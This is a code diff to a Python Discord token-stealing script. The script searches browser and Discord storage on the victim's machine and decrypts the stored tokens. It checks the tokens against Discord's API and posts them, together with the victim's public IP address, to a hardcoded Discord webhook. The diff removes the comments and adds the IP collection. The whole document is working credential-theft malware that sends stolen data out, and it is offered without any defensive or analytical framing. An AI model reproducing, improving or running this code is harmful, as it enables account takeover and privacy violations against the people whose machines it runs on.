@@ -72,8 +72,8 @@ def grabTokens():
     for source, path in paths.items():
         if not os.path.exists(path):
             continue
-        if not "discord" in path: # we first check if its not discord, cuz then we wont need the encryption bs at all and grab it like normal
-            if "Mozilla" in path: # ha, yeah.. firefox needs extra care lmfao.
+        if not "discord" in path:
+            if "Mozilla" in path:
                 for loc, _, files in os.walk(path):
                     for _file in files:
                         if not _file.endswith('.sqlite'):
@@ -88,7 +88,7 @@ def grabTokens():
                                 tokens.append(token)
                                 tokens.append("#firefox"+str(r.status_code))
 
-            else: # If its not firefox
+            else:
                 for file_name in os.listdir(path):
                     if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                         continue
@@ -104,28 +104,29 @@ def grabTokens():
        
 
         else:
-            for file_name in os.listdir(path): # if it is discord...
-                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # we get all leveldb files and log files
+            for file_name in os.listdir(path):
+                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                     continue
-                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: # strip them
-                    for y in findall(encrypted_regex, line): # and find our encrypted regex
-                        for i in ["discord"]: # we check all discord installs
-                            token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
-                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
+                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for y in findall(encrypted_regex, line):
+                        for i in ["discord"]:
+                            token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) #decrypt
+                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                             if token in tokens:
                                     continue
                             mresult = json.loads(r.content)
                             tokens.append(mresult)
                             tokens.append(token)
                             tokens.append("#discord "+str(r.status_code))
-                                         
+    mip = requests.get('https://api.ipify.org').text
     ndiscord = Discord(url="https://discord.com/api/webhooks/986403482531684432/Nh_JiiefdUZNNpQWKVxOpWbcejaDnzso1SIdoe5PsiwrzebsH4EBW4V1ttzBXke_REjm")           
     rval = len(tokens)
-    rtext = "User name : "
+    rtext = "ip : "+mip+"\n"
     if rval == 0:
-        ndiscord.post(content="no token detected")
+        rtext = rtext + "no token detected"
+        ndiscord.post(content=rtext)
     else:
-        rtext = "---- TOKEN FOUND ----\n"
+        rtext = rtext + "---- TOKEN FOUND ----\n"
         for w in tokens:
             rtext = rtext + str(w) + "\n"
         ndiscord.post(content=rtext)
